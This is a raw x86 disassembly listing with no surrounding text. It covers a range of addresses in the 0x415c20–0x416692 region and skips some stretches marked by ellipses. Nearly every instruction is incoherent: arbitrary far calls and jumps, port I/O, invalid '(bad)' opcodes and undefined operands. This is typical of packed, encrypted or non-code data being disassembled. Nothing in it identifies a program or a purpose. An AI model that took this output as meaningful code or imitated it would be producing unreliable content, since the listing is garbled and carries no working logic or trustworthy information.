  415c20:	call   0xc3b2:0xcc0932ad
  415c27:	gs sub eax,0x6a769a7e
  415c2d:	inc    esi
  415c2e:	xchg   ebx,eax
  415c2f:	adc    esi,ebx
  415c31:	dec    esi
  415c32:	inc    ebx
  415c33:	ins    DWORD PTR es:[edi],dx
  415c34:	test   al,0xf7
  415c36:	(bad)  
  415c37:	jbe    0x415c85
  415c39:	out    dx,al
  415c3a:	sbb    al,0x92
  415c3c:	int    0xad
  415c3e:	jno    0x415bf6
  415c40:	in     al,0xdd
  415c42:	gs jmp 0x415c94
  415c45:	and    al,0x2e
  415c47:	mov    edx,0x99fcdc4e
  415c4c:	mov    WORD PTR [ebx-0x4d],gs
  415c4f:	lock push esp
  415c51:	in     al,0x56
  415c53:	jmp    0xc66d384a
  415c58:	leave  
  415c59:	mov    ?,WORD PTR [ebx-0x9cf82cb]
  415c5f:	cwde   
  415c60:	(bad)  
  415c61:	cmp    edi,DWORD PTR [edi]
  415c63:	call   0x58b7:0x6c149111
  415c6a:	mov    al,ds:0x81c85307
  415c6f:	sub    BYTE PTR [esi],ah
  415c71:	push   esp
  415c72:	lea    esi,[ecx-0x77]
  415c75:	xor    DWORD PTR [esp+ebp*8+0x3d],ebp
  415c79:	ja     0x415ca6
  415c7b:	inc    edx
  415c7c:	cmp    bh,BYTE PTR [esi-0x1ea91acc]
  415c82:	dec    ebp
  415c83:	inc    esi
  415c84:	lds    ebx,FWORD PTR [ecx-0x55356ba7]
  415c8a:	fidivr DWORD PTR [edi]
  415c8c:	xchg   ebp,eax
  415c8d:	iret   
  415c8e:	cmc    
  415c8f:	xchg   esi,eax
	...
  415cf4:	cmp    dl,BYTE PTR [eax]
  415cf6:	mov    edi,0xbbbfbf3c
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x7d131f
  415d03:	mov    ecx,0xe62c
  415d08:	add    al,0x1
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	(bad)  
  415d0d:	cmp    edx,esp
  415d0f:	add    eax,0x82e855db
  415d14:	pushf  
  415d15:	inc    edi
  415d16:	neg    DWORD PTR [ecx-0x23086dc0]
  415d1c:	stos   BYTE PTR es:[edi],al
  415d1d:	scas   al,BYTE PTR es:[edi]
  415d1e:	sbb    al,al
  415d20:	fist   WORD PTR [edx-0x1c9a09cb]
  415d26:	push   ebp
  415d27:	jmp    FWORD PTR [edx]
  415d29:	pop    ebp
  415d2a:	add    edx,DWORD PTR [edx]
  415d2c:	aad    0xee
  415d2e:	fsubr  st(7),st
  415d30:	in     eax,dx
  415d31:	loope  0x415d32
  415d33:	sar    BYTE PTR [ebx-0x4b248d57],1
  415d39:	mov    bh,0x63
  415d3b:	shl    BYTE PTR [eax-0x5b663168],0xe8
  415d42:	inc    ebx
  415d43:	push   esp
  415d44:	arpl   WORD PTR [ecx-0x64],si
  415d47:	in     al,0xaa
  415d49:	call   0x7f9c:0xf84d3387
  415d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d51:	xor    ah,BYTE PTR [edx+0x7525ba02]
  415d57:	cmc    
  415d58:	jne    0x415d34
  415d5a:	add    BYTE PTR [edx-0x1e],0xba
  415d5e:	adc    eax,0x751833e1
  415d63:	mov    ecx,?
  415d65:	stos   BYTE PTR es:[edi],al
  415d66:	in     eax,0x93
  415d68:	fisub  WORD PTR [ebx+0x42]
  415d6b:	lods   al,BYTE PTR ds:[esi]
  415d6c:	lods   eax,DWORD PTR ds:[esi]
  415d6d:	or     al,0x6c
  415d6f:	adc    eax,0xc452bb39
  415d74:	xchg   edi,eax
  415d75:	inc    esp
  415d76:	xchg   esi,eax
  415d77:	test   BYTE PTR [ebp+edx*2+0x7b],cl
  415d7b:	adc    BYTE PTR [ecx-0x430c635f],dh
  415d81:	pop    esp
  415d82:	outs   dx,DWORD PTR ds:[esi]
  415d83:	mov    BYTE PTR [edi-0x72092f4e],al
  415d89:	call   0xd31c:0x626ea4f6
  415d90:	mov    ds:0x26985e5,eax
  415d95:	int3   
  415d96:	cdq    
  415d97:	addr16 hlt 
  415d99:	aad    0xd
  415d9b:	mov    al,ds:0xa7499684
  415da0:	repnz sbb ebp,DWORD PTR [ecx+edx*4+0x7598ed66]
  415da8:	sub    DWORD PTR [ebp-0x51b82fe2],esi
  415dae:	out    dx,eax
  415daf:	xlat   BYTE PTR ds:[ebx]
  415db0:	iret   
  415db1:	dec    ebp
  415db2:	adc    eax,0xdf730684
  415db7:	push   edx
  415db8:	jo     0x415dc3
  415dba:	jl     0x415d48
  415dbc:	cwde   
  415dbd:	xchg   BYTE PTR [esi],al
  415dbf:	or     ah,BYTE PTR [edi]
  415dc1:	and    eax,0x3c75dc5b
  415dc6:	fnstsw WORD PTR [esi-0x35]
  415dc9:	bound  ebx,QWORD PTR ds:0x34933e59
  415dcf:	stos   DWORD PTR es:[edi],eax
  415dd0:	xchg   ecx,eax
  415dd1:	not    ah
  415dd3:	sub    BYTE PTR [ebx+0x10],dh
  415dd6:	mov    eax,ds:0x4d8f8348
  415ddb:	mov    bl,0x90
  415ddd:	mov    bl,0x38
  415ddf:	or     dh,BYTE PTR [ecx-0x721fd8c3]
  415de5:	leave  
  415de6:	dec    eax
  415de7:	int3   
  415de8:	xchg   ebx,eax
  415de9:	fld    QWORD PTR [esi-0x3a3d1858]
  415def:	mov    bh,0x7
  415df1:	and    DWORD PTR [edi-0x76],0x85975b65
  415df8:	inc    edi
  415df9:	ret    0x68fa
  415dfc:	inc    esp
  415dfd:	and    bl,bh
  415dff:	imul   ebp,DWORD PTR [esi],0xffffffec
  415e02:	fsub   QWORD PTR [ebx]
  415e04:	inc    DWORD PTR [ecx-0xd1d1f4c]
  415e0a:	aam    0xad
  415e0c:	nop
  415e0d:	pushf  
  415e0e:	lods   eax,DWORD PTR ds:[esi]
  415e0f:	rol    BYTE PTR [eax],1
	...
  415e71:	add    BYTE PTR [eax],al
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x4b]
  415e81:	fbstp  TBYTE PTR [ebx+0xe73061]
  415e87:	add    BYTE PTR [ecx+eax*1],al
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	sub    DWORD PTR [edx],ebp
  415e8e:	je     0x415e4f
  415e90:	push   ss
  415e91:	clc    
  415e92:	mov    bh,0xa9
  415e94:	push   es
  415e95:	and    DWORD PTR [eax+ecx*4],esi
  415e98:	icebp  
  415e99:	das    
  415e9a:	jmp    0xfd61c98f
  415e9f:	loope  0x415ee8
  415ea1:	jo     0x415ea1
  415ea3:	push   ss
  415ea4:	jecxz  0x415f04
  415ea6:	pop    ebp
  415ea7:	pusha  
  415ea8:	lods   eax,DWORD PTR ds:[esi]
  415ea9:	dec    ecx
  415eaa:	jecxz  0x415e85
  415eac:	push   ecx
  415ead:	je     0x415e4e
  415eaf:	ins    DWORD PTR es:[edi],dx
  415eb0:	xchg   esp,eax
  415eb1:	retf   0x882c
  415eb4:	or     eax,0x957f9c77
  415eb9:	mov    cl,0xa
  415ebb:	pop    edi
  415ebc:	jg     0x415e8e
  415ebe:	(bad)  
  415ebf:	ficom  DWORD PTR [ecx+0x7]
  415ec2:	cmp    BYTE PTR [esi],0x55
  415ec5:	jmp    0xe847:0x9235b9cf
  415ecc:	ficom  DWORD PTR [ebx+ebx*2+0x13ca0002]
  415ed3:	mov    al,BYTE PTR [edi]
  415ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed6:	test   al,0x7f
  415ed8:	sub    DWORD PTR [eax+edx*2],esi
  415edb:	fisttp DWORD PTR [ebx+0x3cbd2b83]
  415ee1:	js     0x415f51
  415ee3:	mov    dh,BYTE PTR [ebp-0x7d16e46a]
  415ee9:	nop
  415eea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eeb:	outs   dx,DWORD PTR ds:[esi]
  415eec:	push   es
  415eed:	or     DWORD PTR [ebx+0x6b],esp
  415ef0:	mov    fs,WORD PTR gs:[eax]
  415ef3:	inc    esi
  415ef4:	sbb    esp,0xffffff91
  415ef7:	(bad)
  415efa:	jecxz  0x415edf
  415efc:	mov    al,0xa7
  415efe:	xor    DWORD PTR ds:0x4d3daa9a,edx
  415f04:	js     0x415efe
  415f06:	imul   ebp,DWORD PTR [esi-0x6b653ea6],0xffffffab
  415f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f0e:	test   BYTE PTR ds:0xef232b1,ch
  415f14:	xchg   esp,eax
  415f15:	in     eax,dx
  415f16:	dec    esi
  415f17:	push   ds
  415f18:	jno    0x415f69
  415f1a:	ss jae 0x415eac
  415f1d:	sbb    BYTE PTR [esi+0x75],dl
  415f20:	mov    ebx,0xf3f2d852
  415f25:	jae    0x415f02
  415f27:	sbb    DWORD PTR [edi+0x784a8957],edi
  415f2d:	cmp    al,0x8f
  415f2f:	rcl    DWORD PTR [eax-0x1575cbca],cl
  415f35:	add    al,0x7e
  415f37:	inc    ebp
  415f38:	mov    al,0x7b
  415f3a:	push   eax
  415f3b:	ins    DWORD PTR es:[edi],dx
  415f3c:	stc    
  415f3d:	in     eax,0x5
  415f3f:	ins    DWORD PTR es:[edi],dx
  415f40:	shl    BYTE PTR cs:[ebx-0x31],cl
  415f44:	scas   al,BYTE PTR es:[edi]
  415f45:	sbb    BYTE PTR [ecx],ah
  415f47:	fs ins DWORD PTR es:[edi],dx
  415f49:	mov    edx,0x2ff5d7de
  415f4e:	clc    
  415f4f:	retf   
  415f50:	xor    ebx,ecx
  415f52:	emms   
  415f54:	dec    esp
  415f55:	lods   eax,DWORD PTR ds:[esi]
  415f56:	mov    ebp,0x588fd7b3
  415f5b:	or     BYTE PTR [ecx+0x44],bh
  415f5e:	sbb    ebx,DWORD PTR [ecx-0x7544de2]
  415f64:	fmul   QWORD PTR [edi+0x5d3c3fe]
  415f6a:	jne    0x415f7c
  415f6c:	fdiv   st,st(0)
  415f6e:	and    DWORD PTR ds:0x974305c9,esi
  415f74:	add    ecx,DWORD PTR cs:[eax]
  415f77:	jecxz  0x415fb6
  415f79:	and    al,0x4
  415f7c:	add    DWORD PTR [eax],esp
  415f7e:	(bad)  
  415f7f:	std    
  415f80:	xchg   ebp,eax
  415f81:	out    dx,al
  415f82:	not    DWORD PTR [edx-0x57]
  415f85:	jno    0x415ffa
  415f87:	sbb    dl,BYTE PTR [edi+ecx*2+0x3]
  415f8b:	or     DWORD PTR [edi],edi
  415f8d:	in     eax,0xb2
  415f8f:	mov    bh,0x0
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	mov    esp,0x347f1c95
  416005:	call   0x145600a
  41600a:	add    BYTE PTR [eax],al
  41600c:	das    
  41600d:	std    
  41600e:	mov    edx,0xc73ae297
  416013:	jp     0x415fe0
  416015:	retf   
  416016:	sub    eax,0xc53655a6
  41601b:	dec    edx
  41601c:	ret    0xd219
  41601f:	adc    DWORD PTR [ebx],0xfb9c3cbc
  416025:	cmp    ecx,DWORD PTR [ebp-0x77d5a17c]
  41602b:	pop    edx
  41602c:	fbstp  TBYTE PTR [edx+0x38]
  41602f:	(bad)  
  416030:	jp     0x415fba
  416032:	icebp  
  416033:	pop    es
  416034:	out    dx,al
  416035:	call   0x6753c6c9
  41603a:	inc    eax
  41603b:	repz cmp al,0x3
  41603e:	or     eax,0xd47acb97
  416043:	mov    dl,0x3b
  416045:	(bad)  
  416046:	retf   
  416047:	aas    
  416048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416049:	mov    bh,0xe5
  41604b:	sahf   
  41604c:	adc    DWORD PTR [edi],esp
  41604e:	cmp    bh,BYTE PTR [esi+0x15c5e7db]
  416054:	clc    
  416055:	and    bh,dl
  416057:	aam    0xbd
  416059:	bound  ecx,QWORD PTR [edi-0x1e40cd13]
  41605f:	adc    esp,esp
  416061:	out    dx,eax
  416062:	push   0xc6b94a29
  416067:	fcos   
  416069:	dec    esp
  41606a:	dec    ebx
  41606b:	inc    esp
  41606c:	sub    al,0x61
  41606e:	cmp    bl,BYTE PTR [ecx+0x5732cadc]
  416074:	jl     0x41603e
  416076:	out    dx,eax
  416077:	inc    edx
  416078:	mov    WORD PTR ds:0x84a28cc5,?
  41607e:	pop    edx
  41607f:	into   
  416080:	push   es
  416081:	sar    DWORD PTR ds:0x9c06820d,1
  416087:	mov    DWORD PTR [edi],eax
  416089:	sub    ah,BYTE PTR [edx]
  41608b:	leave  
  41608c:	push   ebx
  41608d:	stos   BYTE PTR es:[edi],al
  41608e:	push   ss
  41608f:	jmp    0xa39b:0x971620cd
  416096:	inc    ebx
  416097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416098:	xor    edx,DWORD PTR ds:0x5aa63336
  41609e:	sahf   
  41609f:	cmp    cl,BYTE PTR [esp+edx*4+0x3f]
  4160a3:	jecxz  0x4160a8
  4160a5:	std    
  4160a6:	in     al,dx
  4160a7:	out    dx,al
  4160a8:	xchg   al,dl
  4160aa:	in     eax,0xeb
  4160ac:	mov    dh,0xb3
  4160ae:	rcl    DWORD PTR [ebx+0x4b],0x4f
  4160b2:	aaa    
  4160b3:	xor    dh,BYTE PTR ds:0x7ddd006b
  4160b9:	mov    ebp,0x94e5f446
  4160be:	jnp    0x416046
  4160c0:	xchg   edx,eax
  4160c1:	adc    ebx,DWORD PTR [ebx]
  4160c3:	sahf   
  4160c4:	call   0xa1c7:0xc997b8c9
  4160cb:	add    eax,ecx
  4160cd:	mov    dh,0x92
  4160cf:	add    ebp,DWORD PTR [ebp-0x3f203c75]
  4160d5:	xchg   edx,eax
  4160d6:	pextrw edi,mm6,0x32
  4160da:	cmp    BYTE PTR [ebp+0x25be2571],cl
  4160e0:	fwait
  4160e1:	pop    esi
  4160e2:	jg     0x4160d0
  4160e4:	aaa    
  4160e5:	sub    eax,DWORD PTR [edx-0x51]
  4160e8:	nop
  4160e9:	push   cs
  4160ea:	aad    0xad
  4160ec:	add    DWORD PTR [edx],ecx
  4160ee:	xchg   BYTE PTR [ebp-0x6d9e5101],dl
  4160f4:	mov    edx,0x934ffa12
  4160f9:	lods   eax,DWORD PTR ds:[esi]
  4160fa:	stos   BYTE PTR es:[edi],al
  4160fb:	jge    0x41613f
  4160fd:	aam    0xfb
  4160ff:	repnz cmp cl,cl
  416102:	lahf   
  416103:	push   esi
  416104:	popa   
  416105:	pop    ebp
  416106:	mov    bl,0x76
  416108:	ret    
  416109:	imul   eax,DWORD PTR [ebp+0x77822451],0xffffff9f
	...
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0x26401cf3
  416183:	lods   al,BYTE PTR ds:[esi]
  416184:	cmp    cl,ch
  416186:	add    BYTE PTR [eax],al
  416188:	add    al,0x1
  41618a:	add    BYTE PTR [eax],al
  41618c:	mov    ds:0xcc898aa5,eax
  416191:	aad    0x7
  416193:	sbb    BYTE PTR [eax],ah
  416195:	ins    DWORD PTR es:[edi],dx
  416196:	ja     0x4161a7
  416198:	jo     0x41620a
  41619a:	ffree  st(4)
  41619c:	and    bl,BYTE PTR [ecx]
  41619e:	jo     0x4161c0
  4161a0:	out    0x83,al
  4161a2:	jno    0x416173
  4161a4:	jmp    0x41613b
  4161a6:	sbb    bl,dh
  4161a8:	adc    edx,edi
  4161aa:	push   cs
  4161ab:	xlat   BYTE PTR ds:[ebx]
  4161ac:	rol    BYTE PTR [edi+0x57571360],1
  4161b2:	clc    
  4161b3:	aad    0x8f
  4161b5:	outs   dx,BYTE PTR ds:[esi]
  4161b6:	call   0xa7e2dde8
  4161bb:	mov    edx,0x3724b658
  4161c0:	jecxz  0x4161a1
  4161c2:	mov    esp,0xd36b6df
  4161c7:	js     0x4161b9
  4161c9:	mov    ebx,DWORD PTR [edx-0x24142780]
  4161cf:	cld    
  4161d0:	mov    al,0xfc
  4161d2:	fcompp 
  4161d4:	mov    WORD PTR [edi-0x70],es
  4161d7:	fisttp WORD PTR [ebx+ebx*2]
  4161da:	gs int3 
  4161dc:	sbb    BYTE PTR [esi-0x36e14220],al
  4161e2:	mov    fs,esp
  4161e4:	and    al,0x5c
  4161e6:	cmp    al,0x60
  4161e8:	sahf   
  4161e9:	dec    esp
  4161ea:	jge    0x416193
  4161ec:	pusha  
  4161ed:	retf   0x4851
  4161f0:	add    ebx,DWORD PTR [edx+0x71]
  4161f3:	int    0xc1
  4161f5:	frstor [esi]
  4161f7:	push   ecx
  4161f8:	(bad)  [ecx-0x7ec0f7e1]
  4161fe:	xchg   edi,eax
  4161ff:	in     eax,0x9f
  416201:	mov    eax,0xd71bfb33
  416206:	add    DWORD PTR ds:0x93d1492b,ecx
  41620c:	icebp  
  41620d:	das    
  41620e:	(bad)  
  41620f:	aad    0x53
  416211:	pop    ss
  416212:	das    
  416213:	cmp    al,0x6b
  416215:	xchg   edx,eax
  416216:	and    al,0x37
  416218:	mov    esp,0x72177753
  41621d:	mov    esi,0x22ffd04
  416222:	dec    ebp
  416223:	xchg   BYTE PTR [ebp-0x32],dh
  416226:	or     al,0xb
  416228:	loope  0x416270
  41622a:	xchg   esi,eax
  41622b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41622c:	fimul  WORD PTR [esi-0x6e]
  41622f:	xor    DWORD PTR [edi],ecx
  416231:	cmp    eax,0x36dcd11f
  416236:	enter  0xdf0d,0xe1
  41623a:	pop    ds
  41623b:	pop    edx
  41623c:	aam    0x4d
  41623e:	in     eax,dx
  41623f:	sub    al,bh
  416241:	ret    0xe2a5
  416244:	fwait
  416245:	xchg   ebp,eax
  416246:	in     al,dx
  416247:	dec    eax
  416248:	mov    ebp,0xa1ec257a
  41624d:	mov    ecx,0xea18f13a
  416252:	mov    edi,0xae78aa48
  416257:	aad    0xac
  416259:	mov    bh,0x63
  41625b:	xchg   ecx,eax
  41625c:	hlt    
  41625d:	adc    DWORD PTR [esi],eax
  41625f:	popa   
  416260:	sar    ebp,cl
  416262:	inc    ebp
  416263:	std    
  416264:	loopne 0x4162e4
  416266:	xchg   ebx,eax
  416267:	repnz inc esp
  416269:	in     al,dx
  41626a:	test   al,0x58
  41626c:	inc    eax
  41626d:	inc    eax
  41626e:	jo     0x4162dd
  416270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416271:	jp     0x4162b4
  416273:	sbb    ch,BYTE PTR [ebx+ecx*1-0x7a0ced3b]
  41627a:	or     dh,BYTE PTR [esp+ebp*1-0x2]
  41627e:	or     al,0x75
  416280:	dec    ebp
  416281:	adc    eax,0x4a0737fb
  416286:	mov    bh,0x35
  416288:	cdq    
  416289:	imul   edx,DWORD PTR [ebx-0x30],0x70fb45c5
	...
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3c8e:0x67a6b2ee
  416305:	jmp    0x0:0x1040000
  41630c:	test   BYTE PTR [edi+0x71],al
  41630f:	das    
  416310:	mov    WORD PTR ds:0x4e9e7416,ds
  416316:	loop   0x4162f6
  416318:	add    ch,bh
  41631a:	pop    ds
  41631b:	clc    
  41631c:	ffreep st(0)
  41631e:	pop    ds
  41631f:	loope  0x41630f
  416321:	sub    BYTE PTR [esi+0xa20f1d3],bh
  416327:	pop    eax
  416328:	mov    esi,0x7e788cb4
  41632d:	test   eax,0xe1f33bcd
  416332:	mov    ds:0xd12dcf21,al
  416337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416338:	mov    WORD PTR [eax],cs
  41633a:	lds    ebx,FWORD PTR [ebx]
  41633c:	push   edx
  41633d:	adc    DWORD PTR [esi+0x1d031b2a],edi
  416343:	jg     0x416360
  416345:	inc    edi
  416346:	rcl    BYTE PTR [edi-0x1a],cl
  416349:	xchg   edi,eax
  41634a:	push   ds
  41634b:	ins    BYTE PTR es:[edi],dx
  41634c:	stc    
  41634d:	jo     0x416342
  41634f:	hlt    
  416350:	xlat   BYTE PTR ds:[ebx]
  416351:	dec    edi
  416352:	and    BYTE PTR [esi+0x28640740],al
  416358:	push   edx
  416359:	popf   
  41635a:	fst    DWORD PTR [ebx+0x1006c9aa]
  416360:	adc    ecx,DWORD PTR [edx+ebp*2+0x2f]
  416364:	ins    DWORD PTR es:[edi],dx
  416365:	int3   
  416366:	lea    esi,[ebx-0x18]
  416369:	clc    
  41636a:	(bad)
  41636f:	mov    edi,0x15ed6c94
  416374:	or     cl,BYTE PTR [edx+0x1d]
  416377:	dec    edi
  416378:	mov    al,ds:0x7fa81508
  41637d:	pop    ecx
  41637e:	repnz or DWORD PTR [ecx+0x2b31ce35],esp
  416385:	data16 mov ah,0x4b
  416388:	cmp    BYTE PTR [ecx-0x4bd92c02],bh
  41638e:	jns    0x4163a6
  416390:	dec    ebx
  416391:	adc    eax,0x764f7459
  416396:	mov    ebx,0x2e0f3f21
  41639b:	loop   0x416404
  41639d:	fild   DWORD PTR ds:0x4ddb90a3
  4163a3:	add    ch,cl
  4163a5:	std    
  4163a6:	jle    0x4163d9
  4163a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163a9:	icebp  
  4163aa:	les    esi,FWORD PTR [edi]
  4163ac:	sub    eax,0x773c3a1a
  4163b1:	jns    0x4163d2
  4163b3:	dec    esp
  4163b4:	and    eax,0x4850f34f
  4163b9:	mov    esp,0xbdbd7c5c
  4163be:	cmp    eax,0x5742f35f
  4163c3:	jnp    0x41639b
  4163c5:	neg    BYTE PTR [ebx-0x6a]
  4163c8:	ficom  WORD PTR [ebp-0x6620b6fe]
  4163ce:	jp     0x41644a
  4163d0:	adc    BYTE PTR [esi],0x17
  4163d3:	jb     0x41641c
  4163d5:	xchg   esp,eax
  4163d6:	mov    DWORD PTR [eax+0x7cd00b6],esp
  4163dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163dd:	xchg   esp,ebp
  4163df:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4163e1:	push   esp
  4163e2:	sub    DWORD PTR [ebx-0x3cbf8ffa],0xd4b21edb
  4163ec:	in     eax,0x30
  4163ee:	mov    BYTE PTR [edi-0x30007b6b],cl
  4163f4:	jns    0x4163d1
  4163f6:	cmp    dh,bl
  4163f8:	cli    
  4163f9:	lods   al,BYTE PTR ds:[esi]
  4163fa:	enter  0x64b6,0x3
  4163fe:	dec    ebx
  4163ff:	pop    esi
  416400:	outs   dx,BYTE PTR ds:[esi]
  416401:	test   BYTE PTR [edx],ah
  416403:	adc    al,0x56
  416405:	xlat   BYTE PTR ds:[ebx]
  416406:	aam    0xf7
  416408:	repnz bound ebx,QWORD PTR [edx+0x22]
  41640c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41640d:	cmp    dl,BYTE PTR ds:0xd2
	...
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	pop    ss
  416481:	sub    dl,ah
  416483:	popf   
  416484:	inc    eax
  416485:	jmp    0x416487
  416487:	add    BYTE PTR [ecx+eax*1],al
  41648a:	add    BYTE PTR [eax],al
  41648c:	aam    0x31
  41648e:	lds    ecx,FWORD PTR [eax+0x4010e58c]
  416494:	and    bl,bl
  416496:	pop    ebx
  416497:	jne    0x4164c4
  416499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41649a:	mov    dh,0xee
  41649c:	rcr    BYTE PTR ds:0x8841f166,cl
  4164a2:	mul    DWORD PTR [esi+0x7d]
  4164a5:	addr16 call 0x5d10:0x94706ab6
  4164ad:	push   ss
  4164ae:	mov    gs,WORD PTR [eax-0x16]
  4164b1:	pop    ebx
  4164b2:	das    
  4164b3:	sbb    eax,0x482535e8
  4164b8:	pop    ecx
  4164b9:	xor    DWORD PTR [esi+0x60],ecx
  4164bc:	out    0x45,eax
  4164be:	sub    eax,0x788991b5
  4164c3:	xlat   BYTE PTR ds:[ebx]
  4164c4:	inc    edx
  4164c5:	fs push ss
  4164c7:	cmp    BYTE PTR [ebp+0x71],cl
  4164ca:	inc    edi
  4164cb:	sbb    cl,BYTE PTR [ebx+0x2b]
  4164ce:	fadd   DWORD PTR [ecx+0x4432086b]
  4164d4:	cs push esp
  4164d6:	push   ebp
  4164d7:	xor    ebx,0xec0b8dd8
  4164dd:	shr    BYTE PTR [ebx+0x773e0435],0x6d
  4164e4:	xor    al,0x5c
  4164e6:	and    eax,0xd9b28bdb
  4164eb:	mov    edx,0x7b280cde
  4164f0:	jo     0x416532
  4164f2:	push   ss
  4164f3:	dec    esp
  4164f4:	sub    DWORD PTR [edi+0x3b],esi
  4164f7:	sti    
  4164f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164f9:	and    al,0x2f
  4164fb:	ds (bad) 
  4164fd:	inc    ecx
  4164fe:	add    dh,BYTE PTR [eax-0x59]
  416501:	xchg   esi,eax
  416502:	in     al,dx
  416503:	xchg   ebp,eax
  416504:	out    0x7c,al
  416506:	cmp    al,0x3a
  416508:	outs   dx,DWORD PTR ds:[esi]
  416509:	cmp    BYTE PTR [esi+0x67],ah
  41650c:	enter  0xe030,0x13
  416510:	inc    edi
  416511:	ret    
  416512:	and    eax,0xa61b8e7a
  416517:	mov    ecx,0xbcbad0b
  41651c:	push   cs
  41651d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41651e:	outs   dx,DWORD PTR ds:[esi]
  41651f:	aas    
  416520:	dec    ebp
  416521:	adc    BYTE PTR [ebp+0xbdc3430],0xf5
  416528:	rcl    DWORD PTR [ecx+eax*1],0xab
  41652c:	lods   al,BYTE PTR ds:[esi]
  41652d:	fld    QWORD PTR [eax-0x4b]
  416530:	cwde   
  416531:	scas   eax,DWORD PTR es:[edi]
  416532:	xchg   BYTE PTR [edi],dh
  416534:	mov    esi,DWORD PTR [edi+0x0]
  416537:	sbb    eax,0x7a238bd7
  41653c:	jb     0x41655e
  41653e:	mov    ecx,0x75792a43
  416543:	call   0x40d4:0xa2497d6c
  41654a:	out    0x9,eax
  41654c:	popa   
  41654d:	pop    esi
  41654e:	(bad)  
  41654f:	sti    
  416550:	in     al,0x40
  416552:	pop    ss
  416553:	mov    dh,0x0
  416555:	jbe    0x416530
  416557:	aad    0x63
  416559:	push   eax
  41655a:	icebp  
  41655b:	pop    ecx
  41655c:	sub    al,0x3b
  41655e:	(bad)  
  41655f:	stc    
  416560:	jp     0x41658e
  416562:	ss and eax,ebx
  416565:	cmp    al,0x29
  416567:	mov    ds:0xf3a80143,al
  41656c:	(bad)  
  41656d:	xchg   cl,cl
  41656f:	loope  0x41655f
  416571:	cmc    
  416572:	or     al,0xca
  416574:	push   ebx
  416575:	cmp    BYTE PTR [edx],dh
  416577:	fild   QWORD PTR [ebp+0x22]
  41657a:	cdq    
  41657b:	out    dx,al
  41657c:	cmp    BYTE PTR [edi+0x4f],dl
  41657f:	and    esp,DWORD PTR [ecx+0x14eac50f]
  416585:	jmp    0xf05f:0x38994c32
  41658c:	mov    WORD PTR [edx+0x3a7e],?
	...
  4165f2:	add    BYTE PTR [eax],al
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi+0x554fbcac]
  416601:	lock xor bh,BYTE PTR [eax]
  416604:	inc    esp
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    al,0x1
  41660a:	add    BYTE PTR [eax],al
  41660c:	test   eax,0x7b68a6ae
  416611:	push   esi
  416612:	sbb    ch,BYTE PTR [ecx+esi*4+0x4f81d5e]
  416619:	cwde   
  41661a:	icebp  
  41661b:	push   ecx
  41661c:	aaa    
  41661d:	sub    DWORD PTR [ebp+0x3e],eax
  416620:	aaa    
  416621:	xor    edi,DWORD PTR [ebp+0x16a5860e]
  416627:	jno    0x416630
  416629:	outs   dx,DWORD PTR ds:[esi]
  41662a:	push   cs
  41662b:	mov    edi,0x92b6d052
  416630:	mov    bl,BYTE PTR [ebp+0x5f]
  416633:	(bad)  
  416634:	push   cs
  416635:	sbb    BYTE PTR [esi-0x66520582],ah
  41663b:	adc    eax,0x41c23cca
  416640:	je     0x4165d4
  416642:	pushf  
  416643:	mov    bh,0x3d
  416645:	mov    ebp,0xb549ee2f
  41664a:	arpl   WORD PTR ds:0x7b329163,si
  416650:	(bad)  [esi+0x847b76]
  416656:	fstp   TBYTE PTR [edi+0x61]
  416659:	daa    
  41665a:	repz out 0xf3,eax
  41665d:	fstp   TBYTE PTR [eax-0x55f37e6d]
  416663:	daa    
  416664:	dec    edx
  416665:	xchg   ecx,eax
  416666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416667:	fwait
  416668:	mov    edi,0x730b8791
  41666d:	inc    edi
  41666e:	push   0xf9638b3b
  416673:	mov    DWORD PTR [eax],esp
  416675:	daa    
  416676:	xor    ebp,edx
  416678:	pop    eax
  416679:	adc    eax,0x502fd788
  41667e:	sbb    eax,DWORD PTR [ebx]
  416680:	add    al,0xb1
  416682:	iret   
  416683:	mov    esi,DWORD PTR [esi+esi*1]
  416686:	xchg   ebp,eax
  416687:	shl    BYTE PTR [ebx],1
  416689:	aaa    
  41668a:	adc    esi,0xe46b66c4
  416690:	jl     0x416692
  416692:	mov    ah,0x6e
